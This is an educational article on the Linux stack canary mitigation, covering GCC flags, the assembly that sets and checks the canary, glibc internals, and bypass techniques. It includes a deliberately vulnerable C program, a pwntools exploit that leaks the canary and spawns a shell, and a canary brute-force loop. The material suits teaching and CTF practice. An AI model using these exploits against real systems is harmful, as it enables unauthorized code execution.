# Canary

## Introduction
The word Canary originates from the canary birds that British coal miners used to detect toxic gases underground. Every time miners went down into the mine, they would bring a canary with them. If the underground gas was toxic, the canary, being sensitive to toxins, would stop singing or even die, thus providing an early warning for the miners.

As we know, a common way to exploit stack overflows is by overflowing local variables on the stack, causing the excess data to overwrite ebp, eip, etc., thereby hijacking the control flow. Stack overflow protection is a buffer overflow attack mitigation technique. When a function has a buffer overflow vulnerability, an attacker can overwrite the return address on the stack to execute shellcode. When stack protection is enabled, a cookie value is inserted at the bottom of the stack frame at the beginning of function execution. When the function is about to return, it verifies whether the cookie is still valid (i.e., tests whether the value has been modified before the stack frame is destroyed). If the cookie is invalid, the program stops execution (indicating a stack overflow has occurred). When an attacker overwrites the return address, they often also overwrite the cookie, causing the stack protection check to fail and preventing shellcode execution, thus thwarting the exploit. In Linux, we call this cookie value the Canary.

Since attacks triggered by stack overflows are extremely common and have a long history, a corresponding mitigation technique called Canary appeared in glibc very early on, and it still serves as the first line of defense in system security to this day.

The Canary's implementation and design philosophy are both relatively simple and efficient — it inserts a value at the end of the high-risk area where stack overflows occur. When the function returns, the Canary value is checked to see if it has been modified, thereby determining whether a stack/buffer overflow has occurred.

Canary and Windows GS protection are both effective means of mitigating stack overflow attacks. Their introduction has significantly increased the difficulty of stack overflow attacks, and since they consume almost no system resources, they have become a standard protection mechanism on Linux.


## Canary Principle
### Using Canary in GCC
You can use the following parameters to configure Canary in GCC:

```
-fstack-protector          Enable protection, but only insert protection for functions with arrays in local variables
-fstack-protector-all      Enable protection, insert protection for all functions
-fstack-protector-strong
-fstack-protector-explicit Only enable protection for functions with explicit stack_protect attribute
-fno-stack-protector       Disable protection
```

### Canary Implementation Principle

The stack structure with Canary protection enabled looks roughly like this:

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address

```
When a program is compiled with Canary enabled, in the function prologue, a value is taken from offset 0x28 of the fs register and stored on the stack at the position %ebp-0x8.
This operation inserts the Canary value into the stack, with the following code:
```asm
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

Before the function returns, this value is retrieved and XORed with the value at fs:0x28. If the XOR result is 0, it means the Canary has not been modified and the function returns normally. This operation detects whether a stack overflow has occurred.

```asm
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

If the Canary has been illegally modified, the program flow will enter `__stack_chk_fail`. `__stack_chk_fail` is a function in glibc that, by default, uses ELF lazy binding. It is defined as follows:

```C
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

This means we can hijack the control flow by overwriting the GOT entry of `__stack_chk_fail`, or use `__stack_chk_fail` to leak information (see stack smash).

Furthermore, on Linux, the fs register actually points to the TLS structure of the current stack, and fs:0x28 points to stack\_guard.
```C
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
                       thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```
If an overflow can overwrite the Canary value stored in the TLS, then the protection mechanism can be bypassed.

In fact, the value in the TLS is initialized by the function security\_init.

```C
static void
security_init (void)
{
  // The value of _dl_random is already written by the kernel before entering this function.
  // glibc directly uses the value of _dl_random without assigning it.
  // If this mode is not used, glibc can also generate random numbers on its own.

  // Set the last byte of _dl_random to 0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
  
  // Set the Canary value into TLS
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

// The THREAD_SET_STACK_GUARD macro is used to set TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)

```


## Canary Bypass Techniques

### Preface
Canary is a very effective vulnerability mitigation measure for stack overflow issues. However, it does not mean that Canary can prevent all stack overflow exploits. Here we present common exploitation strategies in the presence of Canary. Please note that each method has specific environmental requirements.

### Leaking Canary from the Stack
Canary is designed to end with the byte `\x00`, which is intended to ensure that Canary can truncate strings.
The idea of leaking the Canary from the stack is to overwrite the low byte of the Canary to print out the remaining Canary portion.
This exploitation method requires a suitable output function and may need a first overflow to leak the Canary, followed by a second overflow to control the execution flow.

#### Exploitation Example

The vulnerable example source code is as follows:

```C
// ex2.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```

Compile as a 32-bit program with PIE protection disabled (NX, ASLR, and Canary protection are enabled by default):

```bash
$ gcc -m32 -no-pie ex2.c -o ex2
```

First, print out the 4-byte Canary by overwriting the last `\x00` byte of the Canary.
Then, calculate the correct offset and place the Canary at the appropriate overflow position to Ret to the getshell function.

```python
#!/usr/bin/env python

from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2')

get_shell = ELF("./ex2").sym["getshell"]

io.recvuntil("Hello Hacker!\n")

# leak Canary
payload = "A"*100
io.sendline(payload)

io.recvuntil("A"*100)
Canary = u32(io.recv(4))-0xa
log.info("Canary:"+hex(Canary))

# Bypass Canary
payload = "\x90"*100+p32(Canary)+"\x90"*12+p32(get_shell)
io.send(payload)

io.recv()

io.interactive()
```
### Brute-Forcing Canary One Byte at a Time

For Canary, although the Canary differs each time a process restarts (compared to GS, which remains the same after restart), different threads within the same process share the same Canary. Additionally,
child processes created via the fork function also have the same Canary, because fork directly copies the parent process's memory. We can leverage this characteristic to brute-force the Canary byte by byte.
In the famous offset2libc article on bypassing all protections on Linux 64-bit, the author used this method to brute-force the Canary.
Here is the brute-force Python code:

```python
print "[+] Brute forcing stack canary "

start = len(p)
stop = len(p)+8

while len(p) < stop:
   for i in xrange(0,256):
      res = send2server(p + chr(i))

      if res != "":
         p = p + chr(i)
         #print "\t[+] Byte found 0x%02x" % i
         break

      if i == 255:
         print "[-] Exploit failed"
         sys.exit(-1)


canary = p[stop:start-1:-1].encode("hex")
print "   [+] SSP value is 0x%s" % canary
```


### Hijacking the __stack_chk_fail Function
As we know, when the Canary check fails, the handling logic enters the `__stack_chk_fail`ed function. The `__stack_chk_fail`ed function is a regular lazy-bound function, and it can be hijacked by modifying its GOT entry.

See ZCTF2017 Login, where the exploitation method involves using a format string bug (fsb) vulnerability to tamper with the GOT entry of `__stack_chk_fail`, followed by ROP exploitation.

### Overwriting the Canary Value Stored in TLS

As we know, Canary is stored in TLS and this value is used for comparison before the function returns. When the overflow size is large enough, it is possible to simultaneously overwrite both the Canary stored on the stack and the Canary stored in TLS to achieve a bypass.

See StarCTF2018 babystack


